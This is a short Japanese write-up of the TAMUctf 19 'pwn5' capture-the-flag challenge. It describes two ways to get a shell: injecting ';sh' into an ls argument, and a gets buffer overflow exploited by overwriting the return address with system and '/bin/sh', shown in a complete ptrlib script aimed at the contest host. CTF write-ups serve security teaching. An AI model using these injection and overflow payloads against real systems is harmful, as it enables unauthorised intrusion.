# [pwn 372pts] pwn5 - TAMUctf 19
32ビットバイナリです。
```
$ checksec pwn5
[*] 'pwn5'
    Arch:       32 bits (little endian)
    NX:         NX enabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
この問題には非想定解があるので、どちらも解説しようと思います。

IDAで解析すると、pwn4と同じくlsの引数を指定できるサービスです。
しかし、引数として与えられるのは3文字だけになっています。

## 解法1
参加したときは気付かなかったのですが、`;sh`と入力すれば`ls ;sh`となってシェルが奪えます。
だからpwn3よりも点数が低いんでしょうね。

## 解法2
入力にはgetsを使っているのでバッファオーバーフローが存在します。
SSPは無効なので、リターンアドレスを書き換えて`system('/bin/sh')`を実行すれば良さそうです。
PIE無効+static linkなのでsystem関数のアドレスは固定で、`/bin/sh`という文字列もバイナリ中に存在します。
もしdynamic linkの場合はputs@pltでputs@gotとかをリークしてもう一度mainに飛ばし、2周目でret2libcすればOKです。

```python
from ptrlib import *

elf = ELF("./pwn5")

sock = Socket("pwn.tamuctf.com", 4325)
#sock = Process("./pwn5")
sock.recvuntil("ls:")

payload = b'A' * 0x11
payload += p32(elf.symbol("system"))
payload += b'A' * 4
payload += p32(0x08048000 + next(elf.find("/bin/sh")))
print(repr(payload))
sock.sendline(payload)

sock.interactive()
```
こんな感じで解けます。

# 感想
基本的なret2libcの問題ですね。
